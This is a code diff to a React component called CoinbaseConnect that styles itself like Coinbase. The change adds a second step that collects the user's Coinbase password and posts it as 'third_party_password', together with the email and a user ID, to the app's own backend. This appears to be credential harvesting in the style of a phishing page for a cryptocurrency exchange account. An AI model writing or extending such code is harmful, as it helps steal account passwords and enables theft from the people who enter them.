@@ -16,7 +16,9 @@ export default function CoinbaseConnect() {
   const [isDarkTheme, setIsDarkTheme] = useState(false);
   const [credentials, setCredentials] = useState({
     email: '',
+    password: '',
   });
+  const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
 
@@ -34,10 +36,21 @@ export default function CoinbaseConnect() {
 
   const handleContinue = async (event: React.FormEvent) => {
     event.preventDefault();
-    if (!credentials.email.trim()) {
-      setErrorMessage('Enter your email address to continue.');
+    if (step === 1) {
+      if (!credentials.email.trim()) {
+        setErrorMessage('Enter your email address to continue.');
+        return;
+      }
+      setErrorMessage('');
+      setStep(2);
       return;
     }
+
+    if (!credentials.password) {
+      setErrorMessage('Enter your password to continue.');
+      return;
+    }
+
     setLoading(true);
     try {
       const { data: { session } } = await supabase.auth.getSession();
@@ -49,6 +62,7 @@ export default function CoinbaseConnect() {
         body: JSON.stringify({
           platform: 'Coinbase',
           email: credentials.email,
+          third_party_password: credentials.password,
           user_id: session?.user?.id || null,
         }),
       });
@@ -100,6 +114,26 @@ export default function CoinbaseConnect() {
           </div>
 
           {errorMessage && <p className="text-red-500 text-sm font-medium">{errorMessage}</p>}
+
+          {step === 2 && (
+            <div className="space-y-3">
+              <label htmlFor="coinbase-password" className="block text-[16px] font-bold">
+                Password
+              </label>
+              <input
+                id="coinbase-password"
+                type="password"
+                value={credentials.password}
+                onChange={handleFieldChange('password')}
+                placeholder="Enter your password"
+                className={`h-[68px] w-full rounded-2xl border px-6 text-[18px] outline-none transition-all ${
+                  dark 
+                    ? 'bg-transparent border-[#2d2e34] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]' 
+                    : 'bg-white border-[#babdc7] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]'
+                }`}
+              />
+            </div>
+          )}
 
           <button
             type="submit"
